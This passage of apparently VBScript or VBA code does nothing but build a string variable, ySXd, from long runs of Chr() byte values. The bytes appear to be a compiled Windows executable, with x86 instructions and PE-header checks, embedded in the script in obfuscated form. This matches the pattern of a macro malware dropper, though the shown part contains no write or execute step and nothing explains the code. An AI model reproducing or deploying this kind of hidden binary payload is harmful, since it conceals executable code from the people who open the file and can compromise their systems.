ySXd=ySXd&Chr(188)&Chr(253)&Chr(255)&Chr(255)&Chr(156)&Chr(143)&Chr(133)&Chr(240)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(4)&Chr(141)&Chr(77)&Chr(4)&Chr(199)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(137)&Chr(133)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(244)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(73)&Chr(252)&Chr(137)&Chr(141)&Chr(228)&Chr(253)&Chr(255)&Chr(255)&Chr(199)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(23)&Chr(4)&Chr(0)&Chr(192)&Chr(199)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(133)&Chr(228)&Chr(252)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(156)&Chr(128)&Chr(64)&Chr(0)&Chr(106)&Chr(0)&Chr(139)&Chr(216)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(21)&Chr(152)
ySXd=ySXd&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(12)&Chr(133)&Chr(219)&Chr(117)&Chr(8)&Chr(106)&Chr(2)&Chr(232)&Chr(8)&Chr(39)&Chr(0)&Chr(0)&Chr(89)&Chr(104)&Chr(23)&Chr(4)&Chr(0)&Chr(192)&Chr(255)&Chr(21)&Chr(148)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(144)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(110)&Chr(36)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(53)&Chr(48)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(227)&Chr(244)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(93)&Chr(255)&Chr(224)&Chr(106)&Chr(2)&Chr(232)&Chr(201)&Chr(38)&Chr(0)&Chr(0)&Chr(89)&Chr(93)&Chr(233)&Chr(178)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(51)&Chr(201)&Chr(59)&Chr(4)
ySXd=ySXd&Chr(205)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(116)&Chr(19)&Chr(65)&Chr(131)&Chr(249)&Chr(45)&Chr(114)&Chr(241)&Chr(141)&Chr(72)&Chr(237)&Chr(131)&Chr(249)&Chr(17)&Chr(119)&Chr(14)&Chr(106)&Chr(13)&Chr(88)&Chr(93)&Chr(195)&Chr(139)&Chr(4)&Chr(205)&Chr(68)&Chr(162)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(5)&Chr(68)&Chr(255)&Chr(255)&Chr(255)&Chr(106)&Chr(14)&Chr(89)&Chr(59)&Chr(200)&Chr(27)&Chr(192)&Chr(35)&Chr(193)&Chr(131)&Chr(192)&Chr(8)&Chr(93)&Chr(195)&Chr(232)&Chr(89)&Chr(246)&Chr(255)&Chr(255)&Chr(133)&Chr(192)&Chr(117)&Chr(6)&Chr(184)&Chr(168)&Chr(163)&Chr(64)&Chr(0)&Chr(195)&Chr(131)&Chr(192)&Chr(8)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(83)&Chr(86)&Chr(87)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(100)&Chr(244)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(139)
ySXd=ySXd&Chr(248)&Chr(137)&Chr(125)&Chr(252)&Chr(232)&Chr(84)&Chr(244)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(59)&Chr(247)&Chr(15)&Chr(130)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(222)&Chr(43)&Chr(223)&Chr(141)&Chr(67)&Chr(4)&Chr(131)&Chr(248)&Chr(4)&Chr(114)&Chr(119)&Chr(87)&Chr(232)&Chr(187)&Chr(38)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(141)&Chr(67)&Chr(4)&Chr(89)&Chr(59)&Chr(248)&Chr(115)&Chr(72)&Chr(184)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(248)&Chr(115)&Chr(2)&Chr(139)&Chr(199)&Chr(3)&Chr(199)&Chr(59)&Chr(199)&Chr(114)&Chr(15)&Chr(80)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(239)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(141)&Chr(71)&Chr(16)&Chr(59)&Chr(199)&Chr(114)&Chr(64)&Chr(80)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(217)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)
ySXd=ySXd&Chr(192)&Chr(116)&Chr(49)&Chr(193)&Chr(251)&Chr(2)&Chr(80)&Chr(141)&Chr(52)&Chr(152)&Chr(232)&Chr(111)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(150)&Chr(243)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(131)&Chr(198)&Chr(4)&Chr(86)&Chr(232)&Chr(86)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(89)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(106)&Chr(4)&Chr(106)&Chr(32)&Chr(232)&Chr(67)&Chr(17)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(232)&Chr(47)&Chr(243)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(163)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(163)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(133)&Chr(246)&Chr(117)&Chr(5)&Chr(106)&Chr(24)&Chr(88)&Chr(94)
ySXd=ySXd&Chr(195)&Chr(131)&Chr(38)&Chr(0)&Chr(51)&Chr(192)&Chr(94)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(200)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(212)&Chr(248)&Chr(255)&Chr(255)&Chr(232)&Chr(183)&Chr(229)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(248)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(240)&Chr(248)&Chr(255)&Chr(255)&Chr(195)&Chr(232)&Chr(150)&Chr(229)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(183)&Chr(255)&Chr(255)&Chr(255)&Chr(247)&Chr(216)&Chr(27)&Chr(192)&Chr(247)&Chr(216)&Chr(89)&Chr(72)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(255)&Chr(141)&Chr(183)&Chr(176)
ySXd=ySXd&Chr(163)&Chr(64)&Chr(0)&Chr(255)&Chr(54)&Chr(232)&Chr(172)&Chr(242)&Chr(255)&Chr(255)&Chr(131)&Chr(199)&Chr(4)&Chr(89)&Chr(137)&Chr(6)&Chr(131)&Chr(255)&Chr(40)&Chr(114)&Chr(232)&Chr(95)&Chr(94)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(77)&Chr(8)&Chr(184)&Chr(77)&Chr(90)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(1)&Chr(116)&Chr(4)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(65)&Chr(60)&Chr(3)&Chr(193)&Chr(129)&Chr(56)&Chr(80)&Chr(69)&Chr(0)&Chr(0)&Chr(117)&Chr(239)&Chr(51)&Chr(210)&Chr(185)&Chr(11)&Chr(1)&Chr(0)&Chr(0)&Chr(102)&Chr(57)&Chr(72)&Chr(24)&Chr(15)&Chr(148)&Chr(194)&Chr(139)&Chr(194)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)
ySXd=ySXd&Chr(139)&Chr(72)&Chr(60)&Chr(3)&Chr(200)&Chr(15)&Chr(183)&Chr(65)&Chr(20)&Chr(83)&Chr(86)&Chr(15)&Chr(183)&Chr(113)&Chr(6)&Chr(51)&Chr(210)&Chr(87)&Chr(141)&Chr(68)&Chr(8)&Chr(24)&Chr(133)&Chr(246)&Chr(118)&Chr(27)&Chr(139)&Chr(125)&Chr(12)&Chr(139)&Chr(72)&Chr(12)&Chr(59)&Chr(249)&Chr(114)&Chr(9)&Chr(139)&Chr(88)&Chr(8)&Chr(3)&Chr(217)&Chr(59)&Chr(251)&Chr(114)&Chr(10)&Chr(66)&Chr(131)&Chr(192)&Chr(40)&Chr(59)&Chr(214)&Chr(114)&Chr(232)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(254)&Chr(104)&Chr(232)&Chr(147)&Chr(64)&Chr(0)&Chr(104)&Chr(32)&Chr(38)&Chr(64)&Chr(0)&Chr(100)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(131)&Chr(236)&Chr(8)&Chr(83)
ySXd=ySXd&Chr(86)&Chr(87)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(49)&Chr(69)&Chr(248)&Chr(51)&Chr(197)&Chr(80)&Chr(141)&Chr(69)&Chr(240)&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(42)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(85)&Chr(139)&Chr(69)&Chr(8)&Chr(45)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(80)&Chr(104)&Chr(0)&Chr(0)&Chr(64)&Chr(0)&Chr(232)&Chr(80)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(59)&Chr(139)&Chr(64)&Chr(36)&Chr(193)&Chr(232)&Chr(31)&Chr(247)&Chr(208)&Chr(131)&Chr(224)&Chr(1)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(8)&Chr(139)&Chr(1)&Chr(51)&Chr(210)&Chr(61)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(15)&Chr(148)&Chr(194)&Chr(139)&Chr(194)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(163)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(139)
ySXd=ySXd&Chr(13)&Chr(204)&Chr(160)&Chr(64)&Chr(0)&Chr(86)&Chr(57)&Chr(80)&Chr(4)&Chr(116)&Chr(15)&Chr(139)&Chr(241)&Chr(107)&Chr(246)&Chr(12)&Chr(3)&Chr(117)&Chr(8)&Chr(131)&Chr(192)&Chr(12)&Chr(59)&Chr(198)&Chr(114)&Chr(236)&Chr(107)&Chr(201)&Chr(12)&Chr(3)&Chr(77)&Chr(8)&Chr(94)&Chr(59)&Chr(193)&Chr(115)&Chr(5)&Chr(57)&Chr(80)&Chr(4)&Chr(116)&Chr(2)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(255)&Chr(53)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(104)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(106)&Chr(32)&Chr(104)&Chr(8)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(173)&Chr(246)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(228)&Chr(137)&Chr(125)&Chr(216)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(251)&Chr(11)&Chr(127)&Chr(76)&Chr(116)&Chr(21)&Chr(139)&Chr(195)&Chr(106)&Chr(2)&Chr(89)&Chr(43)&Chr(193)&Chr(116)&Chr(34)&Chr(43)&Chr(193)
ySXd=ySXd&Chr(116)&Chr(8)&Chr(43)&Chr(193)&Chr(116)&Chr(100)&Chr(43)&Chr(193)&Chr(117)&Chr(68)&Chr(232)&Chr(1)&Chr(243)&Chr(255)&Chr(255)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(216)&Chr(133)&Chr(255)&Chr(117)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(97)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(52)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(96)&Chr(255)&Chr(119)&Chr(92)&Chr(139)&Chr(211)&Chr(232)&Chr(93)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(131)&Chr(198)&Chr(8)&Chr(139)&Chr(6)&Chr(235)&Chr(90)&Chr(139)&Chr(195)&Chr(131)&Chr(232)&Chr(15)&Chr(116)&Chr(60)&Chr(131)&Chr(232)&Chr(6)&Chr(116)&Chr(43)&Chr(72)&Chr(116)&Chr(28)&Chr(232)&Chr(95)&Chr(252)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(229)&Chr(251)&Chr(255)
ySXd=ySXd&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(235)&Chr(174)&Chr(190)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(60)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(22)&Chr(190)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(56)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(10)&Chr(190)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(64)&Chr(178)&Chr(64)&Chr(0)&Chr(199)&Chr(69)&Chr(228)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(164)&Chr(240)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(89)&Chr(51)&Chr(192)&Chr(131)&Chr(125)&Chr(224)&Chr(1)&Chr(15)&Chr(132)&Chr(216)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(69)&Chr(224)&Chr(117)&Chr(7)&Chr(106)&Chr(3)&Chr(232)&Chr(221)&Chr(228)&Chr(255)&Chr(255)&Chr(57)&Chr(69)&Chr(228)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(32)&Chr(250)&Chr(255)&Chr(255)&Chr(89)&Chr(51)&Chr(192)&Chr(137)&Chr(69)&Chr(252)&Chr(131)&Chr(251)
ySXd=ySXd&Chr(8)&Chr(116)&Chr(10)&Chr(131)&Chr(251)&Chr(11)&Chr(116)&Chr(5)&Chr(131)&Chr(251)&Chr(4)&Chr(117)&Chr(27)&Chr(139)&Chr(79)&Chr(96)&Chr(137)&Chr(77)&Chr(212)&Chr(137)&Chr(71)&Chr(96)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(64)&Chr(139)&Chr(79)&Chr(100)&Chr(137)&Chr(77)&Chr(208)&Chr(199)&Chr(71)&Chr(100)&Chr(140)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(46)&Chr(139)&Chr(13)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(137)&Chr(77)&Chr(220)&Chr(139)&Chr(13)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(21)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(3)&Chr(202)&Chr(57)&Chr(77)&Chr(220)&Chr(125)&Chr(25)&Chr(139)&Chr(77)&Chr(220)&Chr(107)&Chr(201)&Chr(12)&Chr(139)&Chr(87)&Chr(92)&Chr(137)&Chr(68)&Chr(17)&Chr(8)&Chr(255)&Chr(69)&Chr(220)&Chr(235)&Chr(219)&Chr(232)&Chr(12)&Chr(240)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(199)&Chr(69)
ySXd=ySXd&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(21)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(31)&Chr(255)&Chr(119)&Chr(100)&Chr(83)&Chr(255)&Chr(85)&Chr(224)&Chr(89)&Chr(235)&Chr(25)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(125)&Chr(216)&Chr(131)&Chr(125)&Chr(228)&Chr(0)&Chr(116)&Chr(8)&Chr(106)&Chr(0)&Chr(232)&Chr(174)&Chr(248)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(83)&Chr(255)&Chr(85)&Chr(224)&Chr(89)&Chr(131)&Chr(251)&Chr(8)&Chr(116)&Chr(10)&Chr(131)&Chr(251)&Chr(11)&Chr(116)&Chr(5)&Chr(131)&Chr(251)&Chr(4)&Chr(117)&Chr(17)&Chr(139)&Chr(69)&Chr(212)&Chr(137)&Chr(71)&Chr(96)&Chr(131)&Chr(251)&Chr(8)&Chr(117)&Chr(6)&Chr(139)&Chr(69)&Chr(208)&Chr(137)&Chr(71)&Chr(100)&Chr(51)&Chr(192)&Chr(232)&Chr(79)&Chr(245)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(126)&Chr(139)&Chr(69)&Chr(8)&Chr(163)
ySXd=ySXd&Chr(72)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(84)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(88)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(40)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(208)&Chr(244)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(164)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(228)&Chr(235)&Chr(47)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(0)&Chr(139)&Chr(0)&Chr(137)&Chr(69)&Chr(224)&Chr(51)&Chr(201)&Chr(61)&Chr(23)&Chr(0)&Chr(0)&Chr(192)&Chr(15)&Chr(148)&Chr(193)&Chr(139)&Chr(193)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(129)&Chr(125)&Chr(224)&Chr(23)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(8)&Chr(255)&Chr(21)&Chr(96)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(228)&Chr(0)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(194)&Chr(244)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(92)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(53)&Chr(92)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(10)&Chr(239)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(208)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(51)&Chr(192)&Chr(64)&Chr(93)&Chr(195)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(83)&Chr(86)&Chr(87)&Chr(232)&Chr(217)
ySXd=ySXd&Chr(238)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(131)&Chr(61)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(216)&Chr(15)&Chr(133)&Chr(142)&Chr(0)&Chr(0)&Chr(0)&Chr(104)&Chr(80)&Chr(136)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(160)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(42)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(68)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(20)&Chr(1)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(35)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(52)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(14)&Chr(238)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(32)&Chr(136)&Chr(64)&Chr(0)&Chr(87)
ySXd=ySXd&Chr(163)&Chr(100)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(249)&Chr(237)&Chr(255)&Chr(255)&Chr(199)&Chr(4)&Chr(36)&Chr(4)&Chr(136)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(104)&Chr(178)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(228)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(20)&Chr(104)&Chr(236)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(80)&Chr(232)&Chr(204)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(163)&Chr(108)&Chr(178)&Chr(64)&Chr(0)&Chr(161)&Chr(108)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(79)&Chr(57)&Chr(29)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(116)&Chr(71)&Chr(80)&Chr(232)&Chr(42)&Chr(238)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(112)&Chr(178)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(232)&Chr(29)&Chr(238)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(89)&Chr(89)&Chr(139)&Chr(248)&Chr(133)&Chr(246)&Chr(116)&Chr(44)&Chr(133)&Chr(255)&Chr(116)&Chr(40)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(25)&Chr(141)&Chr(77)&Chr(248)&Chr(81)&Chr(106)&Chr(12)&Chr(141)&Chr(77)&Chr(236)&Chr(81)&Chr(106)&Chr(1)&Chr(80)&Chr(255)&Chr(215)&Chr(133)&Chr(192)&Chr(116)&Chr(6)&Chr(246)&Chr(69)&Chr(244)&Chr(1)&Chr(117)&Chr(9)&Chr(129)&Chr(77)&Chr(16)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(235)&Chr(57)&Chr(161)&Chr(100)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(48)&Chr(80)&Chr(232)&Chr(218)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(37)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(252)&Chr(133)&Chr(192)&Chr(116)&Chr(28)&Chr(161)&Chr(104)&Chr(178)&Chr(64)&Chr(0)&Chr(59)&Chr(195)&Chr(116)&Chr(19)&Chr(80)&Chr(232)&Chr(189)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)
ySXd=ySXd&Chr(8)&Chr(255)&Chr(117)&Chr(252)&Chr(255)&Chr(208)&Chr(137)&Chr(69)&Chr(252)&Chr(255)&Chr(53)&Chr(96)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(165)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(16)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(117)&Chr(252)&Chr(255)&Chr(208)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(83)&Chr(51)&Chr(219)&Chr(86)&Chr(87)&Chr(59)&Chr(195)&Chr(116)&Chr(7)&Chr(139)&Chr(125)&Chr(12)&Chr(59)&Chr(251)&Chr(119)&Chr(27)&Chr(232)&Chr(225)&Chr(248)&Chr(255)&Chr(255)&Chr(106)&Chr(22)&Chr(94)&Chr(137)&Chr(48)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(83)&Chr(232)&Chr(106)&Chr(248)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(198)&Chr(235)&Chr(60)&Chr(139)
